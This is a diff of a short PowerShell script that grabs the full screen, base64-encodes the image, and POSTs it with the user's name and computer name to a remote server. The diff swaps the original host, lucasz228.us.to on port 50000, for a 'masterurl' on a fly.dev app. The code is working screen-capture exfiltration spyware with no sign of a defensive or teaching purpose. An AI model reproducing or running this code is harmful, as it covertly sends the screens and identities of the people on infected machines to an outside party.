@@ -1,3 +1,5 @@
+$masterurl = "https://hello-flask-poetry-wandering-brook-7760.fly.dev"
+
 Add-Type -AssemblyName System.Windows.Forms
 Add-Type -AssemblyName System.Drawing
 $Screen = [System.Windows.Forms.SystemInformation]::VirtualScreen
@@ -15,4 +17,4 @@ $base64 = [Convert]::ToBase64String($stream.ToArray())
 $stream.Close()
 $graphic.Dispose()
 $bitmap.Dispose()
-Invoke-WebRequest -Uri http://lucasz228.us.to:50000/saveScreenshot -Method POST -Body @{data = $base64; username = $Env:UserName; ComputerName = $Env:ComputerName } 
+Invoke-WebRequest -Uri "$($masterurl)/saveScreenshot" -Method POST -Body @{data = $base64; username = $Env:UserName; ComputerName = $Env:ComputerName } 
